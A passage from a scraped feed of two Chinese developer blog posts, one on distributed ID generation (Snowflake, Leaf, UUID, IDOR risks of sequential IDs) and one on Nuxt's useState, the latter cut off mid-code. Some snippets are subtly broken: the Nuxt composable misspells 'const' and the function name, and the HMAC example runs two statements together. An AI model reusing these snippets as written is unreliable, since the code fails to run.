</ul>
</li>
<li>
<p>这相当于<strong>免费泄露了核心运营数据</strong></p>
</li>
</ul>
<h4 data-id="heading-5"><strong>安全隐患：ID 遍历攻击（IDOR）</strong></h4>
<ul>
<li>如果 URL 是 <code>https://example.com/order/12345</code>，攻击者只需尝试 <code>12346</code>、<code>12347</code>……</li>
<li>如果权限校验不严，就可能<strong>越权访问他人数据</strong>。</li>
<li>即使有权限控制，大量无效请求也会增加服务器负担。</li>
</ul>
<blockquote>
<p>安全最佳实践：<strong>不要依赖“隐藏 ID”来保护数据</strong>，但使用不可预测的 ID 可以显著提高攻击成本</p>
</blockquote>
<h4 data-id="heading-6"><strong>影响 A/B 测试或灰度发布</strong></h4>
<p>如果新功能只对部分用户开放，而用户 ID 是连续的（如 1～10000 是老用户，10001+ 是新用户），容易被识别出测试分组，破坏实验有效性</p>
<h2 data-id="heading-7">分布式主键的核心要求</h2>
<p>ok,上面说了这么多自增主键的坏处，我们来谈谈分布式主键的核心要求</p>
<ol>
<li><strong>全局唯一</strong>（必须）</li>
<li><strong>趋势递增</strong>（有利于索引性能，避免随机写）</li>
<li><strong>高可用 &amp; 高性能</strong>（低延迟、无单点故障）</li>
<li><strong>可扩展</strong>（支持水平扩展）</li>
<li><strong>尽量短</strong>（节省存储和索引空间）</li>
</ol>
<h2 data-id="heading-8">全局分布式生成ID方案: 内外分离</h2>
<p>很多大厂采用“<strong>内部主键 + 外部公开 ID</strong>”的双 ID 体系，接下来我们分开谈谈各自可以怎么做。可以根据业务需要使用，不一定需要双ID体系。</p>
<p>如下图就是一个订单编号，也就是订单表的主键。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8834a65bec6140d6baaf95924975f6d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159813&amp;x-signature=OhLKbITH8u8%2B8%2BHcSJmfRoElM2A%3D" alt="bb08eefae3a0ab86c61b022bb1f9741d.jpg" loading="lazy"/></p>
<h3 data-id="heading-9">内部主键ID</h3>
<p>我们在程序内的，给数据库对应表的主键可以怎么样设计呢？来看看下面的方案吧，有些方案并不是完全适合全局分布式生成ID的要求，我之所以列出来，是因为有这样的方案，大家可以按需理解和使用。</p>
<h4 data-id="heading-10">数据库 Seq 表方案 (传统模式)</h4>
<p>这是最原始的分布式 ID 做法：在数据库中建立一张表，这个表只有有一列，专门用来记录 ID。不同的业务表都对应有这张表</p>
<ul>
<li>
<p><strong>实现：</strong> 每次需要 ID 时，执行类似 <code>REPLACE INTO</code> 或 <code>UPDATE</code> 的操作，利用数据库的自增属性获取新值。</p>
</li>
<li>
<p><strong>痛点：</strong></p>
</li>
</ul>
<p><strong>性能瓶颈：</strong> 每次生成 ID 都得读写数据库，在高并发场景下，数据库会成为严重的单点瓶颈。</p>
<p><strong>高可用风险：</strong> 如果这台 DB 宕机，整个系统的发号功能就瘫痪了</p>
<p><strong>表非常多：</strong> 每一种表都需要对应一张这样的表，那这种seq表就会非常多</p>
<p><strong>本质：</strong> 这种方案本质上还是自增的</p>
<h4 data-id="heading-11">UUID(Universally Unique Identifier)</h4>
<p>这是最简单、最不依赖外部系统的方案。</p>
<ul>
<li>
<p><strong>实现：</strong> Java 的 <code>UUID.randomUUID()</code> 或 Go 的 <code>google/uuid</code> 库。</p>
</li>
<li>
<p><strong>优点：</strong> 本地生成，性能极高，无网络开销。</p>
</li>
<li>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>无序：</strong> 作为 B+ 树主键会导致页分裂，严重影响数据库写入性能。</li>
<li><strong>不可读：</strong> 没有任何业务含义。</li>
<li><strong>太长：</strong> 36 位字符，占用空间大。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-12">Redis <code>INCR</code></h4>
<p>利用 Redis 的原子操作生成 ID。</p>
<ul>
<li><strong>实现：</strong> 通过 <code>INCR</code> 命令实现自增。为了提高可用性，可以采用多个 Redis 节点，设置不同的初始值和相同的步长。</li>
<li><strong>优点：</strong> 性能高于数据库，自增有序。</li>
<li><strong>缺点：</strong> 增加了 Redis 维护成本，且数据持久化（RDB/AOF）如果配置不当，重启后可能导致 ID 重复。本质上还是数据库的方案变种，只不过性能提高了不少。</li>
</ul>
<h4 data-id="heading-13">Snowflake - 雪花算法（重点）</h4>
<p>这是目前分布式系统中最主流的方案，Twitter 开源，非常适合微服务环境。</p>
<h5 data-id="heading-14">结构拆解</h5>
<p>雪花算法生成的 ID 是一个 <strong>64 位的 long 型整数</strong>：</p>
<ol>
<li><strong>1 bit：</strong> 固定为 0，表示正数。</li>
<li><strong>41 bit：</strong> 时间戳（毫秒级）。可以使用约 69 年。</li>
<li><strong>10 bit：</strong> 工作机器 ID。可以部署 1024 个节点。</li>
<li><strong>12 bit：</strong> 序列号。同一毫秒内可产生 4096 个 ID。</li>
</ol>
<h5 data-id="heading-15">优缺点分析</h5>
<ul>
<li>
<p><strong>优点：</strong></p>
<ul>
<li><strong>趋势递增：</strong> 整体按时间排序。</li>
<li><strong>不依赖外部：</strong> 纯本地算法，无网络 I/O。</li>
<li><strong>高性能：</strong> 每秒可产生数百万个 ID。</li>
</ul>
</li>
<li>
<p><strong>缺点：</strong>  <strong>时钟回拨，</strong> 这是雪花算法最大的痛点。如果服务器时间被回拨，可能会产生重复 ID。</p>
</li>
</ul>
<h5 data-id="heading-16">什么是时钟回拨？</h5>
<p>时钟回拨是指系统时钟在运行过程中，由于某些原因导致获取到的当前时间戳比上一次获取的时间戳还要小的现象。</p>
<p><strong>核心成因</strong></p>
<ul>
<li><strong>NTP 强行同步</strong>：服务器通常会通过 NTP (Network Time Protocol) 协议与时间服务器同步。如果本地时钟比 NTP 服务器快，同步时可能会导致本地时间跳回。</li>
<li><strong>管理员手动修改</strong>：运维人员手动调整了服务器系统时间。</li>
<li><strong>闰秒调整</strong>：虽然罕见，但地球自转变化导致的闰秒补偿也可能引起微妙的时间跳变</li>
</ul>
<h5 data-id="heading-17">为什么雪花算法怕回拨？</h5>
<p>雪花算法的核心逻辑是：<code>ID = [1位符号] + [41位时间戳] + [10位机器ID] + [12位序列号]</code>。</p>
<p>如果时间发生了回拨：</p>
<ol>
<li>算法在新的（但较旧的）毫秒内重新从 0 开始计数。</li>
<li>而这个旧的毫秒在真实时间的“过去”已经生成过 ID 了。</li>
<li><strong>结果</strong>：极大概率产生与过去完全相同的 ID，导致数据库主键冲突</li>
</ol>
<h5 data-id="heading-18">时钟回拨常见应对策略？</h5>
<p><strong>方案 A：抛出异常（最简单）</strong></p>
<p>如果检测到当前时间 &lt; 上次生成时间，直接拒绝服务，抛出异常告知上层逻辑。</p>
<p><strong>方案 B：容间等待（最通用）</strong></p>
<p>如果回拨时间很短（例如在 5ms 以内），则让程序线程阻塞（Sleep）等待时间追赶回来。</p>
<p><strong>方案 C：备用机位（高阶方案）</strong></p>
<p>为每台机器分配两个 <code>WorkerID</code>。平时用 A，发生回拨时立即切换到 B，由于机器 ID 不同，即使时间重叠也不会产生重复 ID。</p>
<p><strong>方案 D：时间追赶（百度 UidGenerator 策略）</strong></p>
<p>不再获取系统时间，而是基于上一次生成的 ID 时间戳平滑自增。如果系统时间回拨，逻辑时钟依然向后走</p>
<h4 data-id="heading-19">美团 Leaf算法</h4>
<p>美团的 Leaf 方案集各家之长，提供了两种模式，解决了上述方案的核心痛点。</p>
<h5 data-id="heading-20">Leaf-Segment (号段模式)</h5>
<p>这是对“数据库自增”的深度优化。</p>
<ul>
<li><strong>原理</strong>：不再是每次要 1 个 ID，而是每次从数据库批次获取一个号段（如 1000 个）。</li>
<li><strong>核心优化：双缓存 (Double Buffer)</strong> 当内存中第一个号段用掉 10% 时，Leaf 会异步启动一个线程去预取下一个号段。</li>
<li><strong>效果</strong>：即使数据库短时间宕机，由于内存有缓存，服务依然可用。同时解决了直接访问数据库的性能抖动</li>
</ul>
<h5 data-id="heading-21">Leaf-Snowflake (自愈雪花)</h5>
<p>针对雪花算法的优化：</p>
<ul>
<li><strong>自动分配 WorkerID</strong>：利用 ZooKeeper 的顺序节点自动注册机器 ID，无需手动配置。</li>
<li><strong>时钟回拨校验</strong>：启动时校验时间，运行中如果发现回拨，会报错或自动等待时间追赶。</li>
</ul>
<h3 data-id="heading-22">外部ID</h3>
<p>那么显示在浏览器链接的ID我们又有什么方案呢？来看看吧</p>
<h4 data-id="heading-23"><strong>外部 ID 是内部 ID 的「可逆编码」</strong></h4>
<p>外部显示id就加密一次（如纯 Base62）。</p>
<pre><code class="hljs language-java" lang="java">internal_id = <span class="hljs-number">1284756392012345678</span> 
public_id = <span class="hljs-string">"ord_"</span> + base62_encode(internal_id) # → <span class="hljs-string">"ord_k7mPq9sR"</span>
</code></pre>
<ul>
<li><strong>Base62 编码</strong>：只是将十进制数字转为 <code>0-9a-zA-Z</code> 的字符串表示（类似 hex，但更紧凑）</li>
<li><strong>无哈希、无盐值</strong>，是<strong>完全可逆</strong>的</li>
<li>数据库仍用 <code>BIGINT</code> 存 <code>internal_id</code>，对外展示 <code>public_id</code></li>
<li>查询时：收到 <code>ord_k7mPq9sR</code> → 去掉前缀 → Base62 解码 → 得到 <code>1284756392012...</code> → 直接查主键</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>无额外存储（不需要存 public_id 字段）</li>
<li>查询高效（直接命中主键索引）</li>
<li>保证唯一性（因为内部 ID 唯一）</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>仍然可预测</strong>！<br/>
虽然看起来像乱码，但攻击者知道是 Base62 后，可以反推内部 ID，进而推测业务量。</li>
<li>不具备“不可猜测性”（security through obscurity ≠ security）</li>
</ul>
<blockquote>
<p> <strong>结论</strong>：这种方案<strong>不是真正的安全方案</strong>，只是“美化 ID”或“缩短 URL”，<strong>不能防 IDOR 或防数据推断</strong></p>
</blockquote>
<h4 data-id="heading-24"><strong>外部 ID 是随机生成 or 加密派生</strong></h4>
<p>这种方案<strong>无直接数学对应，需额外存储映射关系</strong>。</p>
<h5 data-id="heading-25">方案 A：<strong>完全随机生成</strong></h5>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">public_id</span> = <span class="hljs-string">"ord_"</span> + secrets.token_urlsafe(<span class="hljs-number">8</span>) <span class="hljs-comment"># → "ord_k7mPq9sR"</span>
</code></pre>
<ul>
<li>每次创建订单时，<strong>独立生成一个随机字符串</strong></li>
<li>在数据库中<strong>额外存一个字段</strong>：<code>public_id VARCHAR(32) UNIQUE</code></li>
<li>查询时：用 <code>public_id</code> 作为查询条件（需在该字段上建唯一索引）</li>
</ul>
<h5 data-id="heading-26">方案 B：<strong>HMAC + 截断（伪随机但确定性）</strong></h5>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用密钥对 internal_id 做 HMAC，再 Base62 编码取前8位 </span>
<span class="hljs-attr">key</span> = b<span class="hljs-string">"your-secret-key"</span> h = hmac.new(key, str(internal_id).encode(), <span class="hljs-string">'sha256'</span>).digest() 
<span class="hljs-attr">public_id</span> = <span class="hljs-string">"ord_"</span> + base62_encode(int.from_bytes(h[:<span class="hljs-number">6</span>], <span class="hljs-string">'big'</span>))[:<span class="hljs-number">8</span>]
</code></pre>
<ul>
<li>相同 internal_id 总是生成相同 public_id（确定性）</li>
<li>但<strong>无法从 public_id 反推 internal_id</strong>（因为 HMAC 不可逆 + 截断信息丢失）</li>
<li><strong>仍需存储 public_id 字段</strong>（因为无法实时反算）</li>
</ul>
<blockquote>
<p>注意：即使使用 HMAC，如果截断太短（如只取 4 字符），可能有碰撞风险。一般建议 ≥8 字符。</p>
</blockquote>
<p><strong>优点：</strong></p>
<ul>
<li><strong>真正不可预测</strong>，防止 ID 遍历和业务数据推断</li>
<li>符合安全最佳实践（OWASP 推荐）</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>需要<strong>额外存储 public_id 字段</strong></li>
<li>需要<strong>在 public_id 上建唯一索引</strong>（增加写开销和存储）</li>
<li>查询路径变长（不能直接用主键）</li>
</ul>
<h2 data-id="heading-27">总结</h2>
<h3 data-id="heading-28">经验之谈</h3>
<ul>
<li><strong>面向公网、用户可见的 ID</strong> → 用<strong>随机生成</strong>，存字段，不可逆（安全优先）</li>
<li><strong>内部系统、API 间调用、日志追踪</strong> → 可用 Base62 编码 Snowflake 或者 单纯Snowflake（效率优先）</li>
</ul>
<p>在 Java 中，我们常用 <code>Long</code> 类型承载分布式 ID，但在 Go 中，由于 <code>int</code> 的长度取决于平台，通常建议明确使用 <code>int64</code>。另外，<strong>一定不要忘记前端精度问题</strong>：JavaScript 的 Number 类型最大只能安全表示 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>53</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{53} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">53</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>，而 64 位 ID 最大是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>63</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{63} - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">63</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>。</p>
<h3 data-id="heading-29">杂谈</h3>
<p>了解分布式生成ID对分布式事务，分库分表这些重点问题都非常重要，而且其中都有很多前人踩过的坑。需要注意的是，不同业务对分布式生成ID的需求度都不同，不一定要按照最严格的去弄，有时候可能适得其反，毕竟适合自己的才是最好的。</p>
<p>如果你觉得这篇文章给你带来了不错的体感，那就给我点赞+收藏+关注吧，这是我更新的最大动力</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nuxt state状态如何管理，3秒手把手帮你]]></title>    <link>https://juejin.cn/post/7595502583269294116</link>    <guid>https://juejin.cn/post/7595502583269294116</guid>    <pubDate>2026-01-16T09:01:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595502583269294116" data-draft-id="7595513077220966446" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nuxt state状态如何管理，3秒手把手帮你"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-16T09:01:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江湖文人"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nuxt state状态如何管理，3秒手把手帮你
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江湖文人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:01:32.000Z" title="Fri Jan 16 2026 09:01:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>用<code>useState</code>。有响应式和支持<code>ssr</code>共享。</p>
<p><code>useState</code>是支持<code>ssr</code>的<code>ref</code>替代方案。其中，在后端渲染后（前端水合）会被保留，并通过唯一键在所有组件之间共享。</p>
<blockquote>
<p><code>useState</code>中的数据将序列化为<code>JSON</code>。</p>
</blockquote>
<h2 data-id="heading-0">例子</h2>
<h3 data-id="heading-1">基本用法</h3>
<p>用组件本地的计算器状态。任何用<code>useState('counter')</code>的组件都共享相同的响应式状态。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">const</span> counter = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'counter'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1000</span>))
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    计算器：{{ counter }}
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"counter++"</span>&gt;</span>
      +
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"counter--"</span>&gt;</span>
      -
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-2">初始化状态</h3>
<p>异步解析去初始化状态。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">const</span> websiteConfig = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'config'</span>)

<span class="hljs-keyword">await</span> <span class="hljs-title function_">callOnce</span>(<span class="hljs-keyword">async</span> () =&gt; {
  websiteConfig.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> $fetch(<span class="hljs-string">'https://my-cms.com/api/website-config'</span>)
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-3">与Pinia一起用</h3>
<p>在<code>Pinia 模块</code>创建全局存储并在整个应用中使用它。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// stores/website.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useWebsiteStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'websiteStore'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">''</span>
  }),
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> infos = <span class="hljs-keyword">await</span> $fetch(<span class="hljs-string">'https://api.nuxt.com/modules/pinia'</span>)
      
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = infos.<span class="hljs-property">name</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">description</span> = infos.<span class="hljs-property">description</span>
    }
  }
})
</code></pre>
<h2 data-id="heading-4">高级用法</h2>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// composables/locale.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useLocale</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useState</span>(<span class="hljs-string">'locale'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">useDefaultLocale</span>().<span class="hljs-property">value</span>)
}

<span class="hljs-keyword">export</span> cosnt useDefautLocale = <span class="hljs-function">(<span class="hljs-params">fallback = <span class="hljs-string">'en-US'</span></span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> locale = <span class="hljs-title function_">ref</span>(fallback)
